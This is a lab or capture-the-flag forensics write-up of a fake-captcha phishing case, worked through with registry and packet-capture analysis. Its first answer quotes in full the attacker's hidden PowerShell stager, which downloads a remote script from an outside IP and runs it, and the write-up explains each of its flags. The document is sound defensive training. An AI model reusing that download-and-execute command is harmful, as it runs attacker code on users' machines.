# **Pikaptcha Writeup**
![image](https://github.com/user-attachments/assets/1dc58453-e983-4bfc-88a0-72008fbe5618)

Happy Grunwald contacted the sysadmin, Alonzo, because of issues he had downloading the latest version of Microsoft Office. He had received an email saying he needed to update, and clicked the link to do it. He reported that he visited the website and solved a captcha, but no office download page came back. Alonzo, who himself was bombarded with phishing attacks last year and was now aware of attacker tactics, immediately notified the security team to isolate the machine as he suspected an attack. You are provided with network traffic and endpoint artifacts to answer questions about what happened.

**Tools:**
  - Registry Explorer
  - Wireshark

**Learned:**
  - Static Malware Analysis
  - Network Forensics
  - Log analysis

### **Question 1**
It is crucial to understand any payloads executed on the system for initial access. Analyzing registry hive for user happy grunwald. What is the full command that was run to download and execute the stager.

Initial analysis we are given a pcap file, and an image of a drive. My initial thought when answering this is since we are wanting to see the command using the ‘NTUSER.DAT’ and use Registry Explorer so we can evaluate this users activity. What comes to my mind is the RunMRU key which shows the history of commands executed by the user. This is what makes most logical sense to me. Loading the ntuser.dat file into registry explorer and searching the RunMRU key I found this peculiar PowerShell command that seems to be the payload we are after. Explaining the payload

- PowerShell: tells it to use PowerShell
- NoP: tells PowerShell to not load the user profile
- NonI: runs the script in a non-interactive mode requiring no user input
- W Hidden: hides the PowerShell window
- Exec Bypass: bypasses PowerShell execution policy
- Command: tells it the following string to execute it as a command
- IEX: invoke expression PowerShell command let that will execute the string expression
- New-Object Net.WebClient: creates a new instance of .NET WebClient
- DownloadString: this downloads the file from the given URL

![image](https://github.com/user-attachments/assets/a0b7f077-2dc7-4400-9469-c3c205f19ba0)

Answer: powershell -NoP -NonI -W Hidden -Exec Bypass -Command “IEX(New-Object Net.WebClient).DownloadString(‘http://43.205.115.44/office2024install.ps1')"

### **Question 2**
At what time in UTC did the malicious payload execute?

This can be found next to where we found the payload which shows when it was executed

![image](https://github.com/user-attachments/assets/cb2c24af-0b83-4006-8134-4ca958e1080b)

Answer: 2024-09: 23 05:07:45
### **Question 3**
The payload which was executed initially downloaded a PowerShell script and executed it in memory. What is sha256 hash of the script?

I believe this is where the pcap will come in handy… since we know the file was downloaded over the http protocol and we have the IP I created a filter to find the file then I exported the object within Wireshark and ran this command

![image](https://github.com/user-attachments/assets/761deb0c-b334-4694-8376-84b4ce95a5e3)

Answer: 579284442094E1A44BEA9CFB7D8D794C8977714F827C97BCB2822A97742914DE
### **Question 4**
To which port did the reverse shell connect?

Since this is wanting to understand the network connection I beleive using the packet capture will give us the detail we are looking for. going back to my earlier filter I am just filtering on the IP address of the malicious site and scrolling through the packet capture file I see it makes a connection over port 6969 shortly after it was downloaded

![image](https://github.com/user-attachments/assets/9d2b9233-9f34-4466-b14d-44d2a7949478)

Answer: 6969
### **Question 5**
For how many seconds was the reverse shell connection established between C2 and the victim’s workstation?

Using the packet capture… I identified when the connection was first made. I will follow the trail to determine when it stopped to help. Since we know the IP and just identified the port I will add that to my filter to help boil the results down: ip.addr == 43.205.115.44 && tcp.port == 6969

![image](https://github.com/user-attachments/assets/5b4bf9ca-e188-4159-9a24-adae3e66fa26)

6 mins and 43 seconds that it was connected. Converting that to seconds it is 403 seconds

Answer: 403
### **Question 6**
Attacker hosted a malicious Captcha to lure in users. What is the name of the function which contains the malicious payload to be pasted in victim’s clipboard?

Here I am thinking looking at the PowerShell script it self but that doesn't make sense after rethinking this. I think since this is talking about the captcha that is web based. Therefore, this is going to be best found in the packet capture. Continuing to filter on the adversary Ip I added http to my filter and since its http its sent in the clear. As I expected I found the malicious function which has the literal payload we found earlier

![image](https://github.com/user-attachments/assets/69a70701-e167-42d1-a75d-75ef5b94aa11)

Answer: stageClipboard
